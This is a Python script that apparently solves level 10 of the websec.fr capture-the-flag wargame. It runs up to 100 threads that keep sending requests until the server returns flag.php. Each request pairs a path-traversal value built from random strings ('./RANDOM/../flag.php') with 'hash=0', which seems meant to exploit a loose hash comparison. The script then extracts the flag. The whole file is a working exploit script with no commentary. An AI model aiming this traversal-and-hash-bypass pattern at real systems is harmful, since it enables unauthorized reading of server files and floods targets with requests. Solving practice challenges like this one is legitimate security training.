import requests as req
import re
import sys
import threading
import time
import random
import string

class ezt:
    def __init__(self,max=10):
        self.max = max
        self.n = 0
        self.threads = []
    
    def new(self,f,args=()):    # add new cycle
        t = threading.Thread(target=f,args=args)
        self.threads.append(t)
        return t
    
    def recycle(self,f,args=()):    # reuse cycle
        self.n +=1
        if self.n > self.max:
            while len(self.termed()) < 1:
                time.sleep(0.1)
            t = self.threads[self.termed()[0]] = threading.Thread(target=f,args=args)
            return t
        else:
            return self.new(f,args)

    def termed(self):       #return terminated thread No.
        return [i for i,t in enumerate(self.threads) if not t.is_alive()]


def random_string(len):
    return ''.join(random.choice(string.ascii_uppercase+string.digits+string.ascii_lowercase) for c in range(len))

def config():
    rand_string = random_string(10)
    url = "http://websec.fr/level10/index.php?f="+"./"+rand_string+"/../flag.php"+"&hash=0"
    res = r.get(url)
    if res.status_code != 200:
        time.sleep(1)
        config()
    else:
        print("[x] - try -> code:"+rand_string+"\n")
        if "Permission denied!" not in res.text and res.status_code==200:
            print("solution : "+url)
            code = re.findall("WEBSEC\{(.*?)\}",res.text)[0]
            print("flag -> WEBSEC{"+code+"}")
            print(exit)
            exit()
            return True
        else:
            return False


r = req.Session()
url = "http://websec.fr/level10/index.php"
e = ezt(100)
while True:
    e.recycle(config).start()
